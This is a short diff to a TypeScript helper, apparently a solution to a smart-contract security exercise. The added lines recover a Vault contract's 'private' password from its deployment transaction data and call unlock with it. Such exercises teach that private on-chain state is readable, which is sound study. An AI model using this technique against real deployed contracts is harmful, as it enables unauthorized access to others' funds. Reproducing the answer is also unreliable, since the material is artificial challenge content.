@@ -8,6 +8,8 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  const password = "0x" + victim.deployTransaction.data.slice(-64);
+  victim.unlock(password);
 };
 
 export default helper;
